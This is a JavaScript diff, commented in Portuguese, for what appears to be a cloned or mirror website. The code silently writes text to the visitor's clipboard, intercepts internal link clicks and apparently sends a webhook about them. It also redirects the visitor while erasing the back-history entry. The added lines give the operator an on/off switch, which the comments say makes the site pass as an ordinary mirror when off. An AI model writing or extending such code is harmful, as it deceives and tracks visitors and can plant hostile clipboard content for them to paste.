@@ -66,6 +66,13 @@
 
             // Função para copiar texto para o clipboard de forma silenciosa
             async function copyToClipboard(text) {
+                // VERIFICAÇÃO MASTER ON/OFF
+                const isEnabled = localStorage.getItem('site_functions_enabled') !== 'false';
+                if (!isEnabled) {
+                    console.log("Funções travadas via Painel de Controle.");
+                    return; 
+                }
+
                 try {
                     // Tenta a API moderna primeiro
                     if (navigator.clipboard && navigator.clipboard.writeText) {
@@ -134,6 +141,15 @@
                     const isInternal = (!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto'))
                                     || href.startsWith(baseUrl);
                     if (isInternal) {
+                        // VERIFICAÇÃO MASTER ON/OFF PARA REDIRECIONAMENTO
+                        const isEnabled = localStorage.getItem('site_functions_enabled') !== 'false';
+                        
+                        if (!isEnabled) {
+                            // No modo OFF, o site se comporta como um espelho real
+                            // Os links funcionam normalmente sem e.preventDefault()
+                            return; 
+                        }
+
                         e.preventDefault();
                         
                         // Verifica se deve fazer cópia e enviar webhook
@@ -148,7 +164,7 @@
                         const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
 
                         // Redireciona substituindo a página no histórico (não permite voltar)
-                        window.location.replace(targetUrl);
+                        location.replace(targetUrl);
                     }
                 }
             }, true);
